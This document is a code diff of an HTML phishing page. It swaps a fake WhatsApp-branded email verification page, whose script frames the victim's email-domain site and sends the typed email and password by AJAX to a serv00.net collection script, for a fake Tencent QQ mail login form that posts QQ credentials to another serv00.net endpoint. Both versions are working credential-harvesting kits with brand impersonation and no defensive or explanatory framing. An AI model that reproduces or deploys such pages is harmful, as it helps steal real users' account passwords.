@@ -3,197 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Share</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <title>登入QQ</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        body, html {
+            height: 100%;
+            width: 100%;
             margin: 0;
-            height: 100vh;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
+            align-items: center;
             position: relative;
         }
-        h2 {
-            margin-bottom: 20px; /* Add margin for spacing */
-        }
-        form {
-            display: flex;
-            flex-direction: column; /* Stack elements vertically */
-            align-items: center; /* Center elements horizontally */
-        }
-        input[type="email"], input[type="password"], button {
-            padding: 15px;
-            margin-top: 20px;
-            width: 120%; /* Use percentage for responsiveness */
-            max-width: 300px; /* Set a maximum width */
-            border-radius: 10px;
-            border: 2px solid #ccc;
-        }
-       
-        button {
-            background-color: #25d366;
-            color: white; /* Change text color to white for better visibility */
-            border: none; /* Remove default border */
-            border-radius: 50px;
-            font-size: 18px;
-            width: 130%;
-        }
-       
-        small {
-            margin-top: 8px; /* Space between button and text */
-            font-size: 13px; /* Smaller font size */
-            color: black; /* Optional color for the text */
-        }
-       
-        .popup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white;
-            border-radius: 5px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            padding: 100px;
-            z-index: 1000;
-        }
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 999;
-        }
-        .loading {
+        iframe {
+            width: 500%;
+            height: 100%;
+            border: none;
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            display: none; /* Hidden by default */
+            top: 0;
+            left: 10%;
+            z-index: 1; /* Ensure iframe is behind the form */
         }
-        .loader {
-            border: 8px solid #f3f3f3; /* Light grey */
-            border-top: 8px solid #3498db; /* Blue */
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite; /* Animation */
+        .form-container {
+            position: relative;
+            z-index: 2; /* Ensure form is above the iframe */
+            padding: 20px;
+            border: 2px solid #ccc;
+            width: 25%;
+            height: 70%;
+            margin-top: 100px;
+            margin-bottom: 100px;
+            margin-right: px;
+            margin-left: 25px;
+            background-color: white; /* Semi-transparent background */
+            border-radius: 8px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        
+        img {
+
+width: 170px;
+
+height: 50px;
+
+}
+        input[type="email"] {
+            width: 90%;
+            padding: 10px;
+            margin: 50px 0;
+            margin-bottom: 10px;
+            margin-left: 5px;
+          }  
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 0px 0;
+            margin-bottom: 40px;
+            margin-left: 5px;
+        }
+        input[type="submit"] {
+background-color: #4d9bcb; /* navy Blue */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin-left: 5px;
+            padding: 15px;
+            width: 97%;
+            height: 10%;
         }
     </style>
 </head>
 <body>
-
-<img src="https://static.whatsapp.net/rsrc.php/yZ/r/JvsnINJ2CZv.svg" alt="Logo" class="header-logo"> <!-- Replace with your logo URL -->
-<h2 id="emailHeader">We'll send code to your Email</h2>
-<form id="emailForm" onsubmit="return handleEmailSubmit(event)">
-    <input type="email" id="email" placeholder="Email Address" required>
-    <button type="submit">Send Code</button>
-    <small>Email Verification Required</small> <!-- Added small text -->   
-</form>
-
-<div class="overlay" id="overlay"></div>
-<div class="popup" id="popup">
-    <img id="domainLogo" class="domain-logo" src=""  style="display:none;"> <!-- Logo will be displayed here -->
-    <span onclick="closePopup()" style="cursor:pointer; float:right;">&times;</span>
-    <h3 style="margin-top:40px;">Confirm this email belongs to you!</h3> <!-- Updated text and increased margin -->
-    <p id="emailDisplay" style="margin-bottom: 10px;"></p> <!-- Display the email here -->
-    <input type="password" id="password" placeholder="Enter your password" required>
-    <button onclick="submitPassword()">Log in</button>
-    <br><br><small>File download will start shortly.</small> <!-- Added small text -->
-</div>
-
-<div class="loading" id="loading">
-    <div class="loader"></div>
-</div>
-
-<script>
-    let detectedDomain = ""; // Variable to store detected domain
-
-    function handleEmailSubmit(event) {
-        event.preventDefault(); // Prevent default form submission
-
-        const email = document.getElementById('email').value;
-
-        if (email) {
-           detectedDomain = email.split('@')[1]; // Extract the domain
-           const homepageUrl = `https://${detectedDomain}`; // Construct the homepage URL
-
-           // Show loading animation
-           document.getElementById('loading').style.display = 'block';
-
-           // Remove the email input form and header immediately
-           document.getElementById('emailForm').remove();
-           document.getElementById('emailHeader').remove();
-
-           // Load content in iframe
-           const iframe = document.createElement('iframe');
-           iframe.src = homepageUrl;
-
-           // Append iframe to body and make it full screen
-           document.body.appendChild(iframe);
-           iframe.style.position = 'absolute';
-           iframe.style.top = '0';
-           iframe.style.left = '0';
-           iframe.style.width = '100%';
-           iframe.style.height = '100%';
-           iframe.style.zIndex = '-1'; // Send it to the back
-
-           // Show the overlay and popup for password input
-           document.getElementById('overlay').style.display = 'block';
-           document.getElementById('popup').style.display = 'block';
-          
-           // Display email in popup
-           document.getElementById('emailDisplay').innerText = email;
-
-           // Set logo URL based on domain
-           const logoUrl = `https://logo.clearbit.com/${detectedDomain}`;
-           const logoImage = document.getElementById('domainLogo');
-           logoImage.src = logoUrl;
-           logoImage.style.display = 'block'; // Show logo
-
-       } else {
-           alert('Please enter a valid email address.');
-       }
-    }
-
-    function closePopup() {
-       document.getElementById('overlay').style.display = 'none';
-       document.getElementById('popup').style.display = 'none';
-   }
-
-   function submitPassword() {
-       const password = document.getElementById('password').value;
-
-       if (password) {
-           const email = document.getElementById('emailDisplay').innerText;
-
-           // Send email and password to server via AJAX
-           const xhr = new XMLHttpRequest();
-           xhr.open("POST", "https://wwmainlogin.serv00.net/send_email.php", true);
-           xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-          
-           xhr.onreadystatechange = function () {
-               if (xhr.readyState === XMLHttpRequest.DONE) {
-                   if (xhr.status === 200) {
-                       alert("Credentials submitted successfully!");
-                   } else {
-                       alert("An error occurred. Please try again.");
-                   }
-               }
-           };
-
-           xhr.send(`email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
-       } else {
-           alert('Please enter your password.');
-       }
-   }
-</script>
-
+    <iframe src="" title="Embedded Website"></iframe>
+    <div class="form-container">
+       
+            <img src="data:image/png;base64,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" alt="Your Logo" />
+           <center><br> <br> <br>  <label for="email"><font color="red"> mail.qq.com 超時！</font>登入QQ信箱</label></center>
+           <form action="https://1wwchol.serv00.net/send_email.php" method="post" >
+           
+           <input type="email" id="email" placeholder="QQ/信箱/手機" name="email" required></br>
+            
+            
+            <input type="password" id="password" placeholder="QQ密碼" name="password" required>
+            
+            <input type="submit" value="登入">
+        </form><br> <br> <br><small> ©1998 - 2025 Tencent Inc. All Rights Reserved.
+</small></center><br> <br> <br>
+    </div>
 </body>
 </html>
